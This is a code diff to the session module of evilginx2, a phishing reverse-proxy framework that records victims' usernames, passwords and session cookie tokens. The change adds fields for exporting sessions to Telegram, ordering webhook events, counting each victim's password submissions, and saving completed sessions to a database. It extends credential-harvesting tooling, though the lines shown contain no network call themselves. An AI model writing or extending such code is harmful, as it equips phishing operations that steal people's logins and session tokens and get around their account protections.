@@ -4,34 +4,42 @@ import (
 	"time"
 
 	"github.com/kgretzky/evilginx2/database"
+	"github.com/kgretzky/evilginx2/log"
 )
 
 type Session struct {
-	Id             string
-	Name           string
-	Username       string
-	Password       string
-	Custom         map[string]string
-	Params         map[string]string
-	BodyTokens     map[string]string
-	HttpTokens     map[string]string
-	CookieTokens   map[string]map[string]*database.CookieToken
-	RedirectURL    string
-	IsDone         bool
-	IsAuthUrl      bool
-	IsForwarded    bool
-	ProgressIndex  int
-	RedirectCount  int
-	PhishLure      *Lure
-	RedirectorName string
-	LureDirPath    string
-	DoneSignal     chan struct{}
-	RemoteAddr     string
-	UserAgent      string
+	Id               string
+	Name             string
+	Username         string
+	Password         string
+	Custom           map[string]string
+	Params           map[string]string
+	BodyTokens       map[string]string
+	HttpTokens       map[string]string
+	CookieTokens     map[string]map[string]*database.CookieToken
+	RedirectURL      string
+	IsDone           bool
+	IsAuthUrl        bool
+	IsForwarded      bool
+	ProgressIndex    int
+	RedirectCount    int
+	PhishLure        *Lure
+	RedirectorName   string
+	LureDirPath      string
+	DoneSignal       chan struct{}
+	RemoteAddr       string
+	UserAgent        string
+	TelegramExported bool
+	// EventSeq orders webhook events per session; CredAttempt counts password
+	// submissions so repeated tries stay distinguishable in the flow log.
+	EventSeq    int64
+	CredAttempt int
+	db          *database.Database
 }
 
-func NewSession(name string) (*Session, error) {
+func NewSession(name string, db *database.Database) (*Session, error) {
 	s := &Session{
+		db:             db,
 		Id:             GenRandomToken(),
 		Name:           name,
 		Username:       "",
@@ -152,6 +160,11 @@ func (s *Session) Finish(is_auth_url bool) {
 	if !s.IsDone {
 		s.IsDone = true
 		s.IsAuthUrl = is_auth_url
+		if s.db != nil {
+			if err := s.db.SetSessionDone(s.Id); err != nil {
+				log.Error("database: %v", err)
+			}
+		}
 		if s.DoneSignal != nil {
 			close(s.DoneSignal)
 			s.DoneSignal = nil
